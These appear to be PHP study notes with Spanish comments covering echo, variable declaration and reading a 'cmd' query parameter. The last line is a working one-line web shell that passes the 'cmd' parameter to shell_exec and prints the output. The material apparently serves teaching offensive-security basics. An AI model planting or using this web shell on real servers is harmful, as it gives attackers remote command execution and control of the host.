---- 

```php
# Ejecutar un "console.log" que se va a interpretar y mostrar en la web
echo "Esto es un texto que se va a interpretar";
# Declaración de variable
$nombre = 'Dobliuw'; 
# Obtener por query un valor bajo el nombre "cmd"
$_GET['cmd'];
$_REQUEST['cmd'];
# Usar etiquetas pre formateadas para unir (.) un comando ejecutado a nivel de sistema (shell_exec) de una query que obtenemos bajo el nombre "cmd"
# Las etiquetas pre formateadas son para que el output no se vea todo en la misma linea
echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
```